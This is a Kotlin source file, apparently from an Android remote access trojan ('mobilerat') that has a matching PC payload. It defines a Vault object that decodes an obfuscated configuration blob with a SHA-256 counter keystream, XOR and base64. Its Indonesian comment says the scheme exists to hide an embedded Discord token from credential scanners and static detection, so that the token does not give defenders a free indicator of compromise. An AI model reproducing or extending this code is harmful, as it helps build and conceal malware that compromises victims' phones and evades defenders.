package com.kai.mobilerat

import java.security.MessageDigest

/**
 * Membuka blob konfigurasi. Algoritmanya sengaja identik dengan
 * `Definisi core/_crypt.py` di payload PC: stream SHA-256 dalam mode counter,
 * XOR, lalu base64. Tujuannya bukan kriptografi kuat — kuncinya ikut di file
 * yang sama — tapi mematikan pencocokan string statis. Token Discord punya
 * pola `[\w-]{24}\.[\w-]{6}[\w-]{27}` yang dicocokkan hampir semua pemindai
 * kredensial, jadi token plaintext di dalam APK itu IOC gratis.
 */
object Vault {

    private const val SEP = "\u001f"

    private fun stream(seed: ByteArray, size: Int): ByteArray {
        val out = ByteArray(size)
        val md = MessageDigest.getInstance("SHA-256")
        var off = 0
        var counter = 0
        while (off < size) {
            md.reset()
            md.update(seed)
            md.update(
                byteArrayOf(
                    (counter ushr 24).toByte(),
                    (counter ushr 16).toByte(),
                    (counter ushr 8).toByte(),
                    counter.toByte()
                )
            )
            val block = md.digest()
            val n = minOf(block.size, size - off)
            System.arraycopy(block, 0, out, off, n)
            off += n
            counter++
        }
        return out
    }

    fun open(blob: String, key: String): List<String> {
        val raw = android.util.Base64.decode(blob, android.util.Base64.NO_WRAP)
        val seed = MessageDigest.getInstance("SHA-256").digest(key.toByteArray(Charsets.UTF_8))
        val ks = stream(seed, raw.size)
        val plain = ByteArray(raw.size) { (raw[it].toInt() xor ks[it].toInt()).toByte() }
        return String(plain, Charsets.UTF_8).split(SEP)
    }
}
